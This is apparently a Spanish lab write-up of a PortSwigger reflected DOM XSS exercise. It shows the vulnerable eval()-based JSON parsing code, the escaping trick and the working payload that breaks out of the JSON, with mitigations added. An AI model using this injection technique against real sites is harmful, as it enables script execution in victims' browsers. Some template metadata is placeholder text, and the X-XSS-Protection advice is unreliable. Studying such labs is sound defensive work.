---
title: "Reflected DOM XSS"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "reflected-dom-xss"
author: "Z4k7"
date: "2026-04-16"
year: "2026"
status: "pwned"
tags:
  - "DOM"
  - "Reflected"
  - "JSON"
  - "Web"
techniques:
  - "DOM XSS"
  - "JSON injection"
  - "eval() exploitation"
  - "quote escaping"
  - "comment injection"
tools:
  - "eval()"
  - "Browser DevTools"
  - "Burp Suite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy que explota DOM XSS mediante eval() inseguro de JSON. La aplicación realiza AJAX request a un endpoint que devuelve JSON con datos de búsqueda. El código vulnerable usa eval('var searchResultsObj = ' + this.responseText) para parsear la respuesta. Cadena de ataque: enviar payload con escape de quotes (\') para salir del JSON → inyectar código JavaScript → cerrar JSON con } → comentar resto con // → ejecutar alert(). Técnicas: JSON injection, eval() RCE, quote escaping, comment injection."
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio demuestra una vulnerabilidad de DOM reflejado. Las vulnerabilidades de DOM reflejado ocurren cuando la aplicación del servidor procesa datos de una solicitud y los devuelve en la respuesta. Un script en la página procesa entonces los datos reflejados de forma insegura, escribiéndolos finalmente en un destino peligroso.
          Para resolver este laboratorio, cree una inyección que llame a la `alert()` función.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417101312816.jpg"
        caption: "Acceso inicial al lab"
      - kind: "note"
        text: |
          Ingresamos la interacción de la web para consultar el funcionamiento de la misma. En este caso enviamos una consulta en el apartado de `Search` para validar el funcionamiento de la web:
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417101515287.jpg"
        caption: "Test de búsqueda inicial"
      - kind: "note"
        text: |
          Al pasar la solicitud por `GET` se dispara una solicitud a un script:
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417102057888.jpg"
        caption: "Network request interceptada"
      - kind: "note"
        text: |
          El código vulnerable que procesa la respuesta es:
      - kind: "code"
        lang: "JS"
        code: |
          function search(path) {
              var xhr = new XMLHttpRequest();
              xhr.onreadystatechange = function() {
                  if (this.readyState == 4 && this.status == 200) {
                      eval('var searchResultsObj = ' + this.responseText);
                      displaySearchResults(searchResultsObj);
                  }
              };
              xhr.open("GET", path + window.location.search);
              xhr.send();
          
              function displaySearchResults(searchResultsObj) {
                  var blogHeader = document.getElementsByClassName("blog-header")[0];
                  var blogList = document.getElementsByClassName("blog-list")[0];
                  var searchTerm = searchResultsObj.searchTerm
                  var searchResults = searchResultsObj.results
          
                  var h1 = document.createElement("h1");
                  h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
                  blogHeader.appendChild(h1);
                  var hr = document.createElement("hr");
                  blogHeader.appendChild(hr)
          
                  for (var i = 0; i < searchResults.length; ++i)
                  {
                      var searchResult = searchResults[i];
                      if (searchResult.id) {
                          var blogLink = document.createElement("a");
                          blogLink.setAttribute("href", "/post?postId=" + searchResult.id);
          
                          if (searchResult.headerImage) {
                              var headerImage = document.createElement("img");
                              headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                              blogLink.appendChild(headerImage);
                          }
          
                          blogList.appendChild(blogLink);
                      }
          
                      blogList.innerHTML += "<br/>";
          
                      if (searchResult.title) {
                          var title = document.createElement("h2");
                          title.innerText = searchResult.title;
                          blogList.appendChild(title);
                      }
          
                      if (searchResult.summary) {
                          var summary = document.createElement("p");
                          summary.innerText = searchResult.summary;
                          blogList.appendChild(summary);
                      }
          
                      if (searchResult.id) {
                          var viewPostButton = document.createElement("a");
                          viewPostButton.setAttribute("class", "button is-small");
                          viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                          viewPostButton.innerText = "View post";
                      }
                  }
          
                  var linkback = document.createElement("div");
                  linkback.setAttribute("class", "is-linkback");
                  var backToBlog = document.createElement("a");
                  backToBlog.setAttribute("href", "/");
                  backToBlog.innerText = "Back to Blog";
                  linkback.appendChild(backToBlog);
                  blogList.appendChild(linkback);
              }
          }
      - kind: "note"
        text: |
          El código anterior toma la información de respuesta de la solicitud y extrae `this.responseText`. Dicho código se almacena en una variable llamada `searchResultsObj` que luego se pasa a la función `displaySearchResults()`.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La línea crítica es: `eval('var searchResultsObj = ' + this.responseText)`. Esto concatena una cadena que será evaluada como código JavaScript. Si puedes controlar `this.responseText` (la respuesta del servidor), puedes inyectar código arbitrario. El servidor refleja tu parámetro de búsqueda en la respuesta JSON — esto es lo que hace que sea 'Reflected DOM XSS'."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultando el comportamiento de la web realiza la existencia en el siguiente orden:
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417105737817.jpg"
        caption: "Flow del ataque"
      - kind: "code"
        lang: "BASH"
        code: |
          Solicitud GET → Script eval() → Respuesta JSON
      - kind: "note"
        text: |
          En este caso contamos con una respuesta por parte del servidor con un JSON. Tratamos de validar si es posible alterar dicha respuesta manipulando el JSON por medio de `eval()`.
          Si enviamos el siguiente código `/Z4kt` para tratar de cerrar el JSON, tenemos como respuesta:
      - kind: "code"
        lang: "JSON"
        code: |
          {"results":[],"searchTerm":"\"\/Z4k"}
      - kind: "note"
        text: |
          Con lo anterior no estaríamos saliendo del campo. Nos representamos que automáticamente toma un `\`. Tratemos de enviar el mismo código pero con `\"Z4kt`:
      - kind: "code"
        lang: "JS"
        code: |
          HTTP/2 200 OK
          Content-Type: application/json; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 37
          
          {"results":[],"searchTerm":"\\\"Z4kt"}
      - kind: "note"
        text: |
          Con lo anterior sí saldríamos del JSON.
      - kind: "callout"
        type: "warning"
        label: "Análisis de quote escaping"
        text: "El servidor escapa las comillas dobles en el JSON con un backslash `\`. Esto es correcto para JSON válido. Sin embargo, cuando eval() procesa la cadena, el backslash se consume como carácter de escape — lo que significa que el quote se convierte en un quote literal en el código JavaScript que se evalúa. Este es el vector de explotación."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Con lo anterior no contamos con información o respuesta por parte del script (lo toma como `searchTerm` vacío).
          Ya se confirma que es posible aplicar código fuera del JSON. Podríamos tratar de enviar una alerta:
      - kind: "code"
        lang: "BASH"
        code: |
          \"-alert(document.domain)
      - kind: "note"
        text: |
          No contamos con respuesta visible por parte del servidor:
      - kind: "code"
        lang: "JS"
        code: |
          HTTP/2 200 OK
          Content-Type: application/json; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 56
          
          {"results":[],"searchTerm":"\\"-alert(document.domain)"}
      - kind: "note"
        text: |
          Si tratamos de completar el JSON con un `}`:
      - kind: "code"
        lang: "BASH"
        code: |
          \"-alert(document.domain)}//
      - kind: "note"
        text: |
          El anterior código cierra/completa el JSON y aplica un estado de comentario después de `//`. Esto causa que a partir de ese punto, lo que sigue se tome como comentario:
      - kind: "code"
        lang: "JSON"
        code: |
          HTTP/2 200 OK
          Content-Type: application/json; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 59
          
          {"results":[],"searchTerm":"\\"-alert(document.domain)}//"}
      - kind: "note"
        text: |
          Desglose del payload:
          1. `\"` — Escapa la comilla que cierra el string `searchTerm`
          2. `-alert(document.domain)` — Código JavaScript a ejecutar (el `-` es simplemente un operador, no causa error)
          3. `}` — Cierra el objeto JSON
          4. `//` — Comenta el resto de la línea (incluyendo la comilla final)
          Cuando `eval()` procesa esto:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          eval('var searchResultsObj = ' + '{"results":[],"searchTerm":"\\"-alert(document.domain)}//"}')
          // Internamente se convierte a:
          eval('var searchResultsObj = {"results":[],"searchTerm":"" - alert(document.domain)}; // rest is comment')
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417111602146.jpg"
        caption: "Payload en búsqueda"
      - kind: "image"
        src: "assets/images/Reflected%20DOM%20XSS/file-20260417111849946.jpg"
        caption: "Confirmación de ejecución 1"
      - kind: "callout"
        type: "info"
        label: "Anatomía de la explotación eval()"
        text: "La vulnerabilidad radica en usar `eval()` para parsear JSON. eval() ejecuta CUALQUIER código JavaScript — no solo JSON. Si controlas el contenido pasado a eval(), controlas qué código se ejecuta.  Alternativa segura: Usar `JSON.parse()` en lugar de `eval()`: ```js var searchResultsObj = JSON.parse(this.responseText);  // ✓ Seguro eval('var searchResultsObj = ' + this.responseText);   // ✗ Inseguro ```"

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El exploit fue ejecutado exitosamente en el navegador:
          1. El payload fue enviado como parámetro de búsqueda en la URL
          2. El servidor reflejó el parámetro en la respuesta JSON (Reflected XSS)
          3. El código vulnerable `eval()` procesó el JSON y ejecutó el código inyectado
          4. El alert mostró `web-security-academy.net` — demostrando ejecución de código arbitrary

lessons:
  - '`eval()` es extremadamente peligroso cuando procesa input del usuario'
  - 'JSON injection es posible escapando quotes y cerrando JSON correctamente'
  - 'Reflected DOM XSS ocurre cuando input se refleja en la respuesta y luego se procesa inseguramente'
  - 'El uso de `//` para comentar puede ocultar el resto del JSON inválido'
  - 'Diferencia entre Reflected y Stored XSS: Reflected requiere que la víctima haga clic en un link; Stored está permanente'
  - 'Los navegadores no validarán si el JSON es válido antes de pasar a eval()'
  - '`eval()` consume escapes de caracteres — `\"` en JSON se convierte en `"` en JavaScript code'
mitigation:
  - 'NUNCA usar `eval()` — Usar `JSON.parse()` para parsear JSON'
  - 'Si debes procesar datos dinámicos, usar `JSON.parse()` con try-catch para validar JSON válido'
  - 'Implementar Content Security Policy (CSP) que bloquee eval-like behavior'
  - 'Sanitizar y validar todo input en el servidor ANTES de reflejarlo en la respuesta'
  - 'Usar librerías modernas (React, Vue, Angular 2+) que escapan por defecto'
  - 'Implementar header `X-Content-Type-Options: nosniff` para prevenir MIME sniffing'
  - 'Usar `X-XSS-Protection: 1; mode=block` (header legacy pero aún útil)'
---
